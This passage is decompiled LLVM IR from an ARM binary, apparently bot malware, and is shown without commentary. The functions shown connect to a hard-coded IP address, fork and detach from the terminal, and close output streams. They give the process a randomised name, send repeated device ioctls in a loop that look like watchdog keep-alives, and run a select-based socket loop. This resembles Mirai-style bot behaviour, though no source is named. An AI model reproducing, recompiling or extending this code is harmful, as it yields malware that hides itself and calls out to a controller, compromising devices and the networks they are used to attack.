  %v1_ed4c = inttoptr i32 %v0_ed4c to i32*
  %v2_ed4c = load i32, i32* %v1_ed4c, align 4
  %v7_ed50 = icmp eq i32 %v2_ed4c, 99
  br i1 %v7_ed50, label %dec_label_pc_edb0, label %dec_label_pc_ed58

dec_label_pc_ed58:                                ; preds = %dec_label_pc_edb0, %bb22, %dec_label_pc_ed4c
  store i32 0, i32* @r4, align 4
  store i32 2, i32* %stack_var_-44, align 4
  %v2_ed70 = load i32, i32* @global_var_1a688.130, align 4
  %v5_ed88 = call i32 @connect(i32 %v2_ed70, %sockaddr* %tmp21, i32 16)
  %v1_ed90 = call i32 @sleep(i32 5)
  %v2_ed94 = load i32, i32* @global_var_1a688.130, align 4
  %v1_ed98 = call i32 @close(i32 %v2_ed94)
  %v1_eda4 = call i32 @function_df44(i32 23815)
  %v1_eda8 = call i32 @function_ec60(i32 %v1_eda4)
  br label %dec_label_pc_ed44

dec_label_pc_edb0:                                ; preds = %dec_label_pc_ed4c
  %v2_edb0 = load i8, i8* bitcast (i8** @global_var_1a694.132 to i8*), align 4
  %v3_edb0 = zext i8 %v2_edb0 to i32
  %v1_edb4 = load i32, i32* @r5, align 4
  %v9_edb4 = icmp eq i32 %v3_edb0, %v1_edb4
  br i1 %v9_edb4, label %dec_label_pc_ed58, label %bb22

bb22:                                             ; preds = %dec_label_pc_edb0
  %v2_edbc = trunc i32 %v1_edb4 to i8
  store i8 %v2_edbc, i8* bitcast (i8** @global_var_1a694.132 to i8*), align 4
  br label %dec_label_pc_ed58

; uselistorder directives
  uselistorder i32* %stack_var_-44, { 1, 0, 3, 2 }
  uselistorder i32 (i32)* @function_df44, { 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32)* @listen, { 1, 0, 4, 3, 2, 5 }
  uselistorder i32 (i32, %sockaddr*, i32)* @bind, { 2, 1, 6, 5, 4, 3, 0, 7 }
  uselistorder i8* bitcast (i8** @global_var_1a694.132 to i8*), { 0, 2, 1 }
  uselistorder i8** @global_var_1a694.132, { 1, 0 }
  uselistorder label %dec_label_pc_ed58, { 1, 0, 2 }
  uselistorder label %dec_label_pc_ed44, { 1, 2, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @function_edd0() local_unnamed_addr {
dec_label_pc_edd0:
  %stack_var_-8 = alloca i32, align 4
  %v3_edd0 = load i32, i32* @r4, align 4
  store i32 %v3_edd0, i32* %stack_var_-8, align 4
  %v1_edd8 = call i32 @function_11394(i32 1)
  %v3_ede0 = call i32 @inet_addr(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_12270.135, i32 0, i32 0))
  store i32 %v3_ede0, i32* @global_var_1a724.138, align 4
  %v3_edf4 = call i32 @function_112b0(i32 1, i32* null)
  %v4_edf4 = inttoptr i32 %v3_edf4 to i8*
  %v2_edf8 = add i32 %v3_edf4, 1
  %v3_edf8 = inttoptr i32 %v2_edf8 to i8*
  %v4_edf8 = load i8, i8* %v3_edf8, align 1
  %v3_edfc = load i8, i8* %v4_edf4, align 1
  store i8 %v4_edf8, i8* bitcast (i32* @global_var_1a723.139 to i8*), align 4
  store i8 %v3_edfc, i8* bitcast (i32* @global_var_1a722.140 to i8*), align 4
  %v2_ee14 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_ee14, i32* @r4, align 4
  %v1_ee18 = call i32 @function_112dc(i32 1)
  %v0_ee1c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_ee1c, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_edd0
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_edd0, %bb
  ret i32 %v1_ee18

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_ee24(i32 %arg1) local_unnamed_addr {
dec_label_pc_ee24:
  %v3_ee24 = load i32, i32* @r4, align 4
  %v6_ee24 = load i32, i32* @r5, align 4
  %v0_ee2c = call i32 @fork()
  %v2_ee30 = icmp eq i32 %v0_ee2c, -1
  %. = zext i1 %v2_ee30 to i32
  %tmp11 = icmp slt i32 %v0_ee2c, 1
  %storemerge5 = select i1 %tmp11, i32 %., i32 1
  store i32 %storemerge5, i32* @r5, align 4
  %v2_ee4c = icmp eq i32 %storemerge5, 0
  store i32 %v0_ee2c, i32* @global_var_1a6c4.142, align 4
  br i1 %v2_ee4c, label %dec_label_pc_ee60, label %dec_label_pc_ee58

dec_label_pc_ee58:                                ; preds = %dec_label_pc_ee24
  store i32 %v3_ee24, i32* @r4, align 4
  store i32 %v6_ee24, i32* @r5, align 4
  ret i32 %v0_ee2c

dec_label_pc_ee60:                                ; preds = %dec_label_pc_ee24
  %v1_ee6c = call i32 @function_11394(i32 26)
  %v1_ee74 = call i32 @function_11394(i32 27)
  %v0_ee78 = load i32, i32* @r5, align 4
  %v2_ee80 = inttoptr i32 %v0_ee78 to i32*
  %v3_ee80 = call i32 @function_112b0(i32 26, i32* %v2_ee80)
  %v4_ee80 = inttoptr i32 %v3_ee80 to i8*
  %v4_ee88 = call i32 (i8*, i32, ...) @open(i8* %v4_ee80, i32 2)
  %v2_ee8c = icmp eq i32 %v4_ee88, -1
  store i32 %v4_ee88, i32* @r4, align 4
  br i1 %v2_ee8c, label %dec_label_pc_eed4, label %dec_label_pc_ee98

dec_label_pc_ee98:                                ; preds = %dec_label_pc_eed4, %dec_label_pc_ee60
  %v0_eea4 = phi i32 [ %v4_eee4, %dec_label_pc_eed4 ], [ %v4_ee88, %dec_label_pc_ee60 ]
  %v2_eeac = call i32 (i32, i32, ...) @ioctl(i32 %v0_eea4, i32 -2147199228)
  br label %dec_label_pc_eeb0

dec_label_pc_eeb0:                                ; preds = %dec_label_pc_eeb0, %dec_label_pc_ee98
  %v0_eebc = load i32, i32* @r4, align 4
  %v2_eec4 = call i32 (i32, i32, ...) @ioctl(i32 %v0_eebc, i32 -2147199227)
  %v1_eecc = call i32 @sleep(i32 10)
  br label %dec_label_pc_eeb0

dec_label_pc_eed4:                                ; preds = %dec_label_pc_ee60
  %v0_eed4 = load i32, i32* @r5, align 4
  %v2_eedc = inttoptr i32 %v0_eed4 to i32*
  %v3_eedc = call i32 @function_112b0(i32 27, i32* %v2_eedc)
  %v4_eedc = inttoptr i32 %v3_eedc to i8*
  %v4_eee4 = call i32 (i8*, i32, ...) @open(i8* %v4_eedc, i32 2)
  %v3_eee8 = icmp eq i32 %v4_eee4, -1
  store i32 %v4_eee4, i32* @r4, align 4
  br i1 %v3_eee8, label %dec_label_pc_eef4, label %dec_label_pc_ee98

dec_label_pc_eef4:                                ; preds = %dec_label_pc_eed4
  %v1_eef8 = call i32 @function_112dc(i32 26)
  %v1_ef00 = call i32 @function_112dc(i32 27)
  %v0_ef04 = load i32, i32* @r5, align 4
  call void @exit(i32 %v0_ef04)
  unreachable

; uselistorder directives
  uselistorder i32 %v4_eee4, { 1, 2, 0 }
  uselistorder i32 %storemerge5, { 1, 0 }
  uselistorder i32 %v0_ee2c, { 2, 0, 1, 3 }
  uselistorder i32 (i32, i32, ...)* @ioctl, { 1, 0, 2 }
  uselistorder i32 (i8*, i32, ...)* @open, { 0, 4, 3, 2, 1, 6, 5, 7 }
}

define i32 @function_ef10(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_ef10:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  %stack_var_-1548 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-38 = alloca i8*, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-524 = alloca i32, align 4
  %stack_var_-396 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-268 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_ef10 = load i32, i32* @r4, align 4
  store i32 %v3_ef10, i32* %stack_var_-36, align 4
  %v6_ef10 = load i32, i32* @r5, align 4
  %v9_ef10 = load i32, i32* @r6, align 4
  %v15_ef10 = load i32, i32* @r8, align 4
  %v2_ef1c = ptrtoint i32* %stack_var_-268 to i32
  store i32 %v2_ef1c, i32* @r4, align 4
  store i32 0, i32* @r5, align 4
  store i32 %arg1, i32* @r6, align 4
  %tmp43 = bitcast i32* %stack_var_-268 to %_TYPEDEF_sigset_t*
  store i32 %tmp, i32* @r8, align 4
  store i32 0, i32* %stack_var_-44, align 4
  %v3_ef34 = call i32 @sigemptyset(%_TYPEDEF_sigset_t* %tmp43)
  %v4_ef40 = call i32 @sigaddset(%_TYPEDEF_sigset_t* %tmp43, i32 2)
  %v0_ef44 = load i32, i32* @r5, align 4
  %v1_ef44 = inttoptr i32 %v0_ef44 to %_TYPEDEF_sigset_t*
  store i32 %v0_ef44, i32* %r2.global-to-local, align 4
  %v7_ef50 = call i32 @sigprocmask(i32 %v0_ef44, %_TYPEDEF_sigset_t* %tmp43, %_TYPEDEF_sigset_t* %v1_ef44)
  %v4_ef5c = call void (i32)* @signal(i32 17, void (i32)* inttoptr (i32 1 to void (i32)*))
  %v4_ef68 = call void (i32)* @signal(i32 5, void (i32)* bitcast (void (i32)** @global_var_ec48.144 to void (i32)*))
  %v0_ef6c = call i32 @function_11c94()
  store i32 %v0_ef6c, i32* @global_var_1a714.104, align 4
  store i32 1494907824, i32* %r2.global-to-local, align 4
  store i8 23, i8* bitcast (i32* @global_var_1a723.139 to i8*), align 4
  store i32 2, i32* %r3.global-to-local, align 4
  store i8 2, i8* bitcast (%sockaddr** @global_var_1a720.137 to i8*), align 4
  store i32 1494907824, i32* @global_var_1a724.138, align 4
  %v0_ef94 = load i32, i32* @r5, align 4
  %v1_ef94 = trunc i32 %v0_ef94 to i8
  store i8 %v1_ef94, i8* bitcast (i32* @global_var_1a722.140 to i8*), align 4
  store i8 %v1_ef94, i8* bitcast (i32* @global_var_1a721.148 to i8*), align 4
  %v6_ef9c = call i32 @function_1144c(i32 %v0_ef6c, i32 ptrtoint (%sockaddr** @global_var_1a720.137 to i32), i32 1494907824, i32 2)
  store i32 ptrtoint (i32* @global_var_edd0.126 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_edd0.126 to i32), i32* @global_var_1a690.128, align 4
  %v2_efb0 = ptrtoint i32* %stack_var_-140 to i32
  store i32 %v2_efb0, i32* @sb, align 4
  %v1_efb4 = call i32 @function_ec60(i32 %v6_ef9c)
  %v1_efb8 = call i32 @function_f71c(i32 %v1_efb4)
  store i32 %v2_efb0, i32* @r0, align 4
  store i32 32, i32* @r1, align 4
  %v0_efc4 = call i32 @function_11a7c()
  %v0_efc8 = load i32, i32* @r6, align 4
  %v7_efc8 = icmp eq i32 %v0_efc8, 2
  br i1 %v7_efc8, label %dec_label_pc_f0f4, label %dec_label_pc_efd0

dec_label_pc_efd0:                                ; preds = %dec_label_pc_f0f4, %dec_label_pc_ef10, %dec_label_pc_f104
  %v0_efd0 = call i32 @function_f6c4()
  store i32 %v0_efd0, i32* %r6.global-to-local, align 4
  %v0_efd8 = load i32, i32* @r8, align 4
  %v1_efd8 = inttoptr i32 %v0_efd8 to i32*
  %v2_efd8 = load i32, i32* %v1_efd8, align 4
  %v1_efdc = inttoptr i32 %v2_efd8 to i8*
  %v2_efdc = call i32 @function_119dc(i8* %v1_efdc)
  store i32 %v2_efdc, i32* %r4.global-to-local, align 4
  %v0_efe4 = load i32, i32* @r8, align 4
  %v1_efe4 = inttoptr i32 %v0_efe4 to i32*
  %v2_efe4 = load i32, i32* %v1_efe4, align 4
  %v1_efe8 = inttoptr i32 %v2_efe4 to i8*
  %v2_efe8 = call i32 @function_119dc(i8* %v1_efe8)
  %v1_efec = sub i32 20, %v2_efdc
  store i32 %v2_efe8, i32* @r5, align 4
  %v0_eff4 = load i32, i32* %r6.global-to-local, align 4
  %v2_eff8 = urem i32 %v0_eff4, %v1_efec
  %v2_f000 = add i32 %v2_eff8, %v2_efe8
  store i32 %v2_f000, i32* @r4, align 4
  %v2_f004 = ptrtoint i32* %stack_var_-108 to i32
  store i32 %v2_f004, i32* @r6, align 4
  %v2_f010 = call i32 @function_f778(i32 %v2_f004, i32 %v2_f000)
  %v2_f014 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_f014, i32* %r2.global-to-local, align 4
  %v1_f018 = load i32, i32* @r4, align 4
  %v2_f018 = add i32 %v1_f018, %v2_f014
  store i32 %v2_f018, i32* %r3.global-to-local, align 4
  store i32 0, i32* @sl, align 4
  %v0_f024 = load i32, i32* @r8, align 4
  %v1_f024 = inttoptr i32 %v0_f024 to i32*
  %v2_f024 = load i32, i32* %v1_f024, align 4
  store i32 %v2_f024, i32* @r0, align 4
  %v3_f028 = add i32 %v2_f018, -72
  %v4_f028 = inttoptr i32 %v3_f028 to i8*
  store i8 0, i8* %v4_f028, align 1
  %v2_f02c = inttoptr i32 %v2_f024 to i8*
  %v3_f02c = call i32 @function_11a04(i8* %v2_f02c, i32 %v2_f004)
  store i32 32, i32* @r1, align 4
  store i32 %v2_f004, i32* @r0, align 4
  %v0_f038 = call i32 @function_11a7c()
  %v0_f03c = call i32 @function_f6c4()
  store i32 %v0_f03c, i32* @r7, align 4
  %v0_f044 = load i32, i32* @r8, align 4
  %v1_f044 = inttoptr i32 %v0_f044 to i32*
  %v2_f044 = load i32, i32* %v1_f044, align 4
  %v1_f048 = inttoptr i32 %v2_f044 to i8*
  %v2_f048 = call i32 @function_119dc(i8* %v1_f048)
  store i32 %v2_f048, i32* %r4.global-to-local, align 4
  %v0_f050 = load i32, i32* @r8, align 4
  %v1_f050 = inttoptr i32 %v0_f050 to i32*
  %v2_f050 = load i32, i32* %v1_f050, align 4
  %v1_f054 = inttoptr i32 %v2_f050 to i8*
  %v2_f054 = call i32 @function_119dc(i8* %v1_f054)
  %v1_f058 = sub i32 20, %v2_f048
  store i32 %v2_f054, i32* @r5, align 4
  %v0_f060 = load i32, i32* @r7, align 4
  %v2_f064 = urem i32 %v0_f060, %v1_f058
  %v2_f068 = add i32 %v2_f064, %v2_f054
  store i32 %v2_f068, i32* @r4, align 4
  %v2_f074 = call i32 @function_f778(i32 %v2_f004, i32 %v2_f068)
  %v1_f07c = load i32, i32* @r4, align 4
  %v2_f07c = add i32 %v1_f07c, %v2_f014
  store i32 %v2_f07c, i32* %r3.global-to-local, align 4
  %v0_f080 = load i32, i32* @sl, align 4
  %v1_f080 = trunc i32 %v0_f080 to i8
  %v3_f080 = add i32 %v2_f07c, -72
  %v4_f080 = inttoptr i32 %v3_f080 to i8*
  store i8 %v1_f080, i8* %v4_f080, align 1
  %v5_f08c = call i32 @prctl(i32 15, i32 %v2_f004, i32 %v2_f07c, i32 %v2_f07c, i32 ptrtoint (i32* @0 to i32))
  %v1_f094 = call i32 @function_11394(i32 5)
  %v3_f0a4 = call i32 @function_112b0(i32 5, i32* nonnull %stack_var_-44)
  %v3_f0a8 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_f0a8, i32* %r2.global-to-local, align 4
  %v3_f0b4 = inttoptr i32 %v3_f0a4 to i32*
  %v4_f0b4 = call i32 @write(i32 1, i32* %v3_f0b4, i32 %v3_f0a8)
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_f0c4 = call i32 @write(i32 ptrtoint (i32* @global_var_12280.152 to i32), i32* inttoptr (i32 1 to i32*), i32 1)
  %v1_f0cc = call i32 @function_112dc(i32 5)
  %v1_f0d0 = call i32 @function_937c(i32 %v1_f0cc)
  %v1_f0d4 = call i32 @function_e4e0(i32 %v1_f0d0)
  %v1_f0d8 = call i32 @function_ee24(i32 %v1_f0d4)
  %v0_f0dc = call i32 @fork()
  %v1_f0e0 = load i32, i32* @sl, align 4
  %v7_f0e4 = icmp sgt i32 %v0_f0dc, %v1_f0e0
  br i1 %v7_f0e4, label %dec_label_pc_f0e8, label %dec_label_pc_f12c

dec_label_pc_f0e8:                                ; preds = %dec_label_pc_efd0
  %v2_f0f0 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_f0f0, i32* %r4.global-to-local, align 4
  store i32 %v6_ef10, i32* %r5.global-to-local, align 4
  store i32 %v9_ef10, i32* %r6.global-to-local, align 4
  store i32 %v15_ef10, i32* %r8.global-to-local, align 4
  ret i32 0

dec_label_pc_f0f4:                                ; preds = %dec_label_pc_ef10
  %v0_f0f4 = load i32, i32* @r8, align 4
  %v1_f0f4 = add i32 %v0_f0f4, 4
  %v2_f0f4 = inttoptr i32 %v1_f0f4 to i32*
  %v3_f0f4 = load i32, i32* %v2_f0f4, align 4
  %v1_f0f8 = inttoptr i32 %v3_f0f4 to i8*
  %v2_f0f8 = call i32 @function_119dc(i8* %v1_f0f8)
  %v8_f100 = icmp sgt i32 %v2_f0f8, 31
  br i1 %v8_f100, label %dec_label_pc_efd0, label %dec_label_pc_f104

dec_label_pc_f104:                                ; preds = %dec_label_pc_f0f4
  %v0_f104 = load i32, i32* @r8, align 4
  %v1_f104 = add i32 %v0_f104, 4
  %v2_f104 = inttoptr i32 %v1_f104 to i32*
  %v3_f104 = load i32, i32* %v2_f104, align 4
  store i32 %v2_efb0, i32* @r0, align 4
  %v2_f10c = bitcast i32* %stack_var_-140 to i8*
  %v3_f10c = call i32 @function_11a04(i8* %v2_f10c, i32 %v3_f104)
  %v0_f110 = load i32, i32* @r8, align 4
  %v1_f110 = add i32 %v0_f110, 4
  %v2_f110 = inttoptr i32 %v1_f110 to i32*
  %v3_f110 = load i32, i32* %v2_f110, align 4
  store i32 %v3_f110, i32* %r4.global-to-local, align 4
  %v1_f118 = inttoptr i32 %v3_f110 to i8*
  %v2_f118 = call i32 @function_119dc(i8* %v1_f118)
  store i32 %v2_f118, i32* @r1, align 4
  store i32 %v3_f110, i32* @r0, align 4
  %v0_f124 = call i32 @function_11a7c()
  br label %dec_label_pc_efd0

dec_label_pc_f12c:                                ; preds = %dec_label_pc_efd0
  %v1_f12c = call i32 @setsid()
  %v0_f134 = load i32, i32* @sl, align 4
  %v1_f138 = call i32 @close(i32 %v0_f134)
  %v1_f140 = call i32 @close(i32 1)
  %v1_f148 = call i32 @close(i32 2)
  %v1_f14c = call i32 @function_937c(i32 %v1_f148)
  %v1_f150 = call i32 @function_e4e0(i32 %v1_f14c)
  %v1_f154 = call i32 @function_ee24(i32 %v1_f150)
  %v1_f158 = call i32 @function_fba0(i32 %v1_f154)
  %v2_f168 = ptrtoint i32* %stack_var_-396 to i32
  store i32 %v2_f168, i32* @r6, align 4
  %v2_f16c = ptrtoint i32* %stack_var_-524 to i32
  store i32 %v2_f16c, i32* @r7, align 4
  %tmp44 = bitcast i32* %stack_var_-396 to %_TYPEDEF_fd_set*
  %tmp45 = bitcast i32* %stack_var_-524 to %_TYPEDEF_fd_set*
  %tmp46 = bitcast i32* %stack_var_-60 to %timeval*
  %v7_f498 = bitcast i8** %stack_var_-38 to i32*
  %v2_f5f0 = ptrtoint i32* %stack_var_-1548 to i32
  %v2_f4a8 = ptrtoint i32* %stack_var_-48 to i32
  %v1_f548 = bitcast i32* %stack_var_-140 to i8*
  %tmp48 = bitcast i32* %stack_var_-76 to %sockaddr*
  br label %dec_label_pc_f170

dec_label_pc_f170:                                ; preds = %dec_label_pc_f170.backedge, %dec_label_pc_f12c
  %v2_f17852 = phi i32 [ %v2_f17852.pre, %dec_label_pc_f170.backedge ], [ %v2_f168, %dec_label_pc_f12c ]
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v4_f17854 = inttoptr i32 %v2_f17852 to i32*
  store i32 0, i32* %v4_f17854, align 4
  %v0_f17c55 = load i32, i32* %r3.global-to-local, align 4
  %v1_f17c56 = add i32 %v0_f17c55, 4
  store i32 %v1_f17c56, i32* %r3.global-to-local, align 4
  %v7_f18057 = icmp eq i32 %v1_f17c56, 128
  br i1 %v7_f18057, label %dec_label_pc_f188, label %dec_label_pc_f178.dec_label_pc_f178_crit_edge

dec_label_pc_f178.dec_label_pc_f178_crit_edge:    ; preds = %dec_label_pc_f170, %dec_label_pc_f178.dec_label_pc_f178_crit_edge
  %v1_f17c58 = phi i32 [ %v1_f17c, %dec_label_pc_f178.dec_label_pc_f178_crit_edge ], [ %v1_f17c56, %dec_label_pc_f170 ]
  %v0_f178.pre = load i32, i32* %r2.global-to-local, align 4
  %v2_f178 = load i32, i32* @r6, align 4
  %v3_f178 = add i32 %v2_f178, %v1_f17c58
  %v4_f178 = inttoptr i32 %v3_f178 to i32*
  store i32 %v0_f178.pre, i32* %v4_f178, align 4
  %v0_f17c = load i32, i32* %r3.global-to-local, align 4
  %v1_f17c = add i32 %v0_f17c, 4
  store i32 %v1_f17c, i32* %r3.global-to-local, align 4
  %v7_f180 = icmp eq i32 %v1_f17c, 128
  br i1 %v7_f180, label %dec_label_pc_f188, label %dec_label_pc_f178.dec_label_pc_f178_crit_edge

dec_label_pc_f188:                                ; preds = %dec_label_pc_f178.dec_label_pc_f178_crit_edge, %dec_label_pc_f170
  %v0_f188 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_f188, i32* %r3.global-to-local, align 4
  store i32 %v0_f188, i32* %r4.global-to-local, align 4
  %v2_f19059 = load i32, i32* @r7, align 4
  %v3_f19060 = add i32 %v2_f19059, %v0_f188
  %v4_f19061 = inttoptr i32 %v3_f19060 to i32*
  store i32 %v0_f188, i32* %v4_f19061, align 4
  %v0_f19462 = load i32, i32* %r3.global-to-local, align 4
  %v1_f19463 = add i32 %v0_f19462, 4
  store i32 %v1_f19463, i32* %r3.global-to-local, align 4
  %v7_f19864 = icmp eq i32 %v1_f19463, 128
  br i1 %v7_f19864, label %dec_label_pc_f1a0, label %dec_label_pc_f190.dec_label_pc_f190_crit_edge

dec_label_pc_f190.dec_label_pc_f190_crit_edge:    ; preds = %dec_label_pc_f188, %dec_label_pc_f190.dec_label_pc_f190_crit_edge
  %v1_f19465 = phi i32 [ %v1_f194, %dec_label_pc_f190.dec_label_pc_f190_crit_edge ], [ %v1_f19463, %dec_label_pc_f188 ]
  %v0_f190.pre = load i32, i32* %r4.global-to-local, align 4
  %v2_f190 = load i32, i32* @r7, align 4
  %v3_f190 = add i32 %v2_f190, %v1_f19465
  %v4_f190 = inttoptr i32 %v3_f190 to i32*
  store i32 %v0_f190.pre, i32* %v4_f190, align 4
  %v0_f194 = load i32, i32* %r3.global-to-local, align 4
  %v1_f194 = add i32 %v0_f194, 4
  store i32 %v1_f194, i32* %r3.global-to-local, align 4
  %v7_f198 = icmp eq i32 %v1_f194, 128
  br i1 %v7_f198, label %dec_label_pc_f1a0, label %dec_label_pc_f190.dec_label_pc_f190_crit_edge

dec_label_pc_f1a0:                                ; preds = %dec_label_pc_f190.dec_label_pc_f190_crit_edge, %dec_label_pc_f188
  store i32 ptrtoint (i32* @global_var_1a688.130 to i32), i32* %r2.global-to-local, align 4
  %v2_f1a4 = load i32, i32* @global_var_1a688.130, align 4
  %v2_f1a8 = icmp eq i32 %v2_f1a4, -1
  br i1 %v2_f1a8, label %dec_label_pc_f1d4, label %dec_label_pc_f1b0

dec_label_pc_f1b0:                                ; preds = %dec_label_pc_f1a0
  %v3_f1b0 = udiv i32 %v2_f1a4, 32
  %v3_f1b4 = mul nuw nsw i32 %v3_f1b0, 4
  %v2_f1bc = add i32 %v3_f1b4, %v2_f014
  store i32 %v2_f1bc, i32* %r3.global-to-local, align 4
  %v1_f1c0 = add i32 %v2_f1bc, -360
  %v2_f1c0 = inttoptr i32 %v1_f1c0 to i32*
  %v3_f1c0 = load i32, i32* %v2_f1c0, align 4
  %v1_f1c4 = urem i32 %v2_f1a4, 32
  %v7_f1cc = shl i32 1, %v1_f1c4
  %v8_f1cc = or i32 %v3_f1c0, %v7_f1cc
  store i32 %v8_f1cc, i32* %r2.global-to-local, align 4
  store i32 %v8_f1cc, i32* %v2_f1c0, align 4
  br label %dec_label_pc_f1d4

dec_label_pc_f1d4:                                ; preds = %dec_label_pc_f1a0, %dec_label_pc_f1b0
  %v2_f1d4 = load i32, i32* @global_var_1a68c.154, align 4
  store i32 %v2_f1d4, i32* %r3.global-to-local, align 4
  %v2_f1d8 = icmp eq i32 %v2_f1d4, -1
  store i32 ptrtoint (i32* @global_var_1a68c.154 to i32), i32* %r8.global-to-local, align 4
  br i1 %v2_f1d8, label %dec_label_pc_f410, label %dec_label_pc_f1e4

dec_label_pc_f1e4:                                ; preds = %dec_label_pc_f410, %dec_label_pc_f1d4, %.thread
  store i32 ptrtoint (i8** @global_var_1a6c8.157 to i32), i32* %r2.global-to-local, align 4
  %v2_f1e8 = load i8, i8* bitcast (i8** @global_var_1a6c8.157 to i8*), align 4
  %v2_f1ec = icmp eq i8 %v2_f1e8, 0
  %v2_f32c = load i32, i32* @global_var_1a68c.154, align 4
  %v3_f330 = udiv i32 %v2_f32c, 32
  store i32 %v3_f330, i32* %r3.global-to-local, align 4
  br i1 %v2_f1ec, label %dec_label_pc_f32c, label %dec_label_pc_f1f4

dec_label_pc_f1f4:                                ; preds = %dec_label_pc_f1e4
  %v3_f1fc = mul nuw nsw i32 %v3_f330, 4
  %v2_f204 = add i32 %v3_f1fc, %v2_f014
  store i32 %v2_f204, i32* %r3.global-to-local, align 4
  %v1_f208 = add i32 %v2_f204, -488
  %v2_f208 = inttoptr i32 %v1_f208 to i32*
  %v3_f208 = load i32, i32* %v2_f208, align 4
  %v1_f20c = urem i32 %v2_f32c, 32
  %v7_f214 = shl i32 1, %v1_f20c
  %v8_f214 = or i32 %v3_f208, %v7_f214
  store i32 %v8_f214, i32* %r2.global-to-local, align 4
  store i32 %v8_f214, i32* %v2_f208, align 4
  br label %dec_label_pc_f21c

dec_label_pc_f21c:                                ; preds = %dec_label_pc_f32c, %dec_label_pc_f1f4
  %v2_f220 = load i32, i32* @global_var_1a688.130, align 4
  %v2_f224 = load i32, i32* @global_var_1a68c.154, align 4
  store i32 %v2_f224, i32* %r3.global-to-local, align 4
  %v5_f230 = icmp slt i32 %v2_f220, %v2_f224
  br i1 %v5_f230, label %bb, label %bb49

bb:                                               ; preds = %dec_label_pc_f21c
  br label %bb49

bb49:                                             ; preds = %dec_label_pc_f21c, %bb
  %v0_f248 = phi i32 [ %v2_f220, %dec_label_pc_f21c ], [ %v2_f224, %bb ]
  store i32 10, i32* %stack_var_-60, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_f248 = add i32 %v0_f248, 1
  store i32 %v2_f16c, i32* %r2.global-to-local, align 4
  %v13_f25c = call i32 @select(i32 %v1_f248, %_TYPEDEF_fd_set* %tmp44, %_TYPEDEF_fd_set* %tmp45, %_TYPEDEF_fd_set* null, %timeval* %tmp46)
  %v14_f25c = trunc i32 %v13_f25c to i8
  %v3_f260 = icmp eq i8 %v14_f25c, -1
  store i32 %v13_f25c, i32* %r3.global-to-local, align 4
  br i1 %v3_f260, label %dec_label_pc_f170.backedge, label %dec_label_pc_f26c

dec_label_pc_f26c:                                ; preds = %bb49
  %v3_f26c = icmp eq i8 %v14_f25c, 0
  br i1 %v3_f26c, label %dec_label_pc_f274, label %dec_label_pc_f294

dec_label_pc_f274:                                ; preds = %dec_label_pc_f26c
  %v0_f274 = load i32, i32* @sl, align 4
  %v6_f280 = inttoptr i32 %v13_f25c to i8*
  store i8* %v6_f280, i8** %stack_var_-38, align 4
  %v2_f284 = srem i32 %v0_f274, 6
  %v2_f288 = icmp eq i32 %v2_f284, 0
  %v1_f28c = add i32 %v0_f274, 1
  store i32 %v1_f28c, i32* @sl, align 4
  br i1 %v2_f288, label %dec_label_pc_f480, label %dec_label_pc_f294

dec_label_pc_f294:                                ; preds = %dec_label_pc_f26c, %dec_label_pc_f274, %dec_label_pc_f480
  store i32 ptrtoint (i32* @global_var_1a688.130 to i32), i32* %r2.global-to-local, align 4
  %v2_f298 = load i32, i32* @global_var_1a688.130, align 4
  %v2_f29c = icmp eq i32 %v2_f298, -1
  br i1 %v2_f29c, label %dec_label_pc_f2c8, label %dec_label_pc_f2a4

dec_label_pc_f2a4:                                ; preds = %dec_label_pc_f294
  %v3_f2a4 = udiv i32 %v2_f298, 32
  %v3_f2a8 = mul nuw nsw i32 %v3_f2a4, 4
  store i32 %v2_f014, i32* @ip, align 4
  %v2_f2b0 = add i32 %v3_f2a8, %v2_f014
  store i32 %v2_f2b0, i32* %r3.global-to-local, align 4
  %v1_f2b4 = add i32 %v2_f2b0, -360
  %v2_f2b4 = inttoptr i32 %v1_f2b4 to i32*
  %v3_f2b4 = load i32, i32* %v2_f2b4, align 4
  %v1_f2b8 = urem i32 %v2_f298, 32
  %v6_f2bc = lshr i32 %v3_f2b4, %v1_f2b8
  store i32 %v6_f2bc, i32* %r2.global-to-local, align 4
  %v1_f2c0 = urem i32 %v6_f2bc, 2
  %v2_f2c0 = icmp eq i32 %v1_f2c0, 0
  store i1 %v2_f2c0, i1* @cpsr_z, align 1
  br i1 %v2_f2c0, label %dec_label_pc_f2c8, label %dec_label_pc_f4fc

dec_label_pc_f2c8:                                ; preds = %dec_label_pc_f2a4, %dec_label_pc_f294
  store i32 ptrtoint (i8** @global_var_1a6c8.157 to i32), i32* %r3.global-to-local, align 4
  %v2_f2cc = load i8, i8* bitcast (i8** @global_var_1a6c8.157 to i8*), align 4
  %v3_f2cc = zext i8 %v2_f2cc to i32
  store i32 %v3_f2cc, i32* %r4.global-to-local, align 4
  %v2_f2d0 = icmp eq i8 %v2_f2cc, 0
  %v2_f358 = load i32, i32* @global_var_1a68c.154, align 4
